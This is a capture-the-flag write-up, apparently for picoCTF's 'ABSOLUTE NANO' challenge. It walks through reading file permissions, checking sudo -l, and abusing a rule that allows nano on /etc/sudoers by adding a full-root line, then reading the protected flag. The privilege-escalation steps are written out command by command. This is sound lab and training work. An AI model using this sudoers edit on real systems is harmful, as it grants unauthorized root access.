````markdown
---

# Challenge: ABSOLUTE NANO

**Category:** General Skills  
**Difficulty:** Medium  

**Challenge Description:**  
You have complete power with nano.  
Think you can get the flag?  
Additional details will be available after launching your challenge instance.  

---

# Solution

I had to first connect to the server,

```bash
$ ssh -p 59368 ctf-player@crystal-peak.picoctf.net
````

```
ctf-player@crystal-peak.picoctf.net's password:

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.17.0-1009-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
```

I check the files,

```bash
$ ls
flag.txt
```

and theres our flag. But when I try to read it,

```bash
$ cat flag.txt
cat: flag.txt: Permission denied
```

I don't have the permission to read it.
[https://askubuntu.com/questions/528411/how-do-you-view-file-permissions](https://askubuntu.com/questions/528411/how-do-you-view-file-permissions)

To check file permissions I typed,

```bash
ls -l flag.txt
-r--r----- 1 root root 35 <date> <time> flag.txt
```

The link does tell me r is read permission. So, I dug more and found,

First char - means it's a file
r--r----- is the security
root root is the owner
35 is the size of the file in bytes
and then the date and time

r--r----- breaks down to

* r-- owner has permission to only read the file
* r-- members of group assigned to the file can read it but cannot write it
* --- all other users have no access to the file

Since I (ctf-player@challenge) don't have access, I'm not the owner or member of the group assigned to the file.

Next I checked what commands I can use on the file with sudo

```bash
$ sudo -l
```

```
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/nano /etc/sudoers
```

Immediately what comes to my attention is `(ALL) NOPASSWD: /bin/nano /etc/sudoers`, as it contains nano, what our challenge description is hinting to use.

I searched what this means and found this,

[https://www.oneidentity.com/learn/how-does-sudo-work-on-linux-unix-for-privilege-management.aspx#:~:text=What%20does%20the%20sudo%20actually,command%20as%20the%20root%20user](https://www.oneidentity.com/learn/how-does-sudo-work-on-linux-unix-for-privilege-management.aspx#:~:text=What%20does%20the%20sudo%20actually,command%20as%20the%20root%20user)

> "
> Don’t allow unlimited password-less execution
> The PASSWD keyword allows you to define a list of commands that can be run with sudo, without a password. You can also specify ALL as the value for this keyword, which results in the user never being prompted for a password. To decrease the chances of unauthorized access, never set the PASSWD field to ALL.
> "

I think I can run

```bash
$ sudo /bin/nano /etc/sudoers
```

without a password

```
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
ctf-player ALL=(ALL) NOPASSWD: /bin/nano /etc/sudoers
```

We can see root priviledges and group priviledges,

```
# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL
```

I can set that for ctf-player too by adding

```
ctf-player ALL=(ALL:ALL) ALL
```

at the end

Now, checking sudo permissions,

```bash
$ sudo -l
```

```
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/nano /etc/sudoers
    (ALL : ALL) ALL
```

And trying to read flag.txt with sudo,

```bash
ctf-player@challenge:~$ cat flag.txt
cat: flag.txt: Permission denied
ctf-player@challenge:~$ sudo cat flag.txt
[sudo] password for ctf-player:
picoCTF{n4n0_4..}
ctf-player@challenge:~$
```

---```

